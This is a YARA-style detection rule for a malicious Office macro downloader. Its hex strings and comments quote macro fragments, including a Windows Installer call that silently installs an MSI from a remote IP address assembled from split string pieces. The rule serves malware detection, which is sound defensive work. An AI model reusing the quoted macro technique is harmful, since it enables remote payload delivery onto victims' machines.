
rule TrojanDownloader_O97M_EncDoc_SZZ_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.SZZ!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {3d 20 22 77 69 6e 64 6f 77 73 69 6e 73 74 61 6c 6c 65 72 2e 69 6e 73 74 61 6c 6c 65 72 22 } //01 00  = "windowsinstaller.installer"
		$a_01_1 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 46 72 4f 57 4b 66 29 } //01 00  = CreateObject(FrOWKf)
		$a_01_2 = {62 71 58 62 6a 2e 49 6e 73 74 61 6c 6c 50 72 6f 64 75 63 74 20 22 68 74 74 70 3a 2f 22 20 26 20 22 2f 31 30 34 2e 32 22 20 26 20 22 33 34 2e 22 20 26 20 22 31 31 38 2e 22 20 26 20 22 31 36 22 20 26 20 22 33 2f 73 69 22 20 26 20 22 2e 6d 73 69 22 } //00 00  bqXbj.InstallProduct "http:/" & "/104.2" & "34." & "118." & "16" & "3/si" & ".msi"
	condition:
		any of ($a_*)
 
}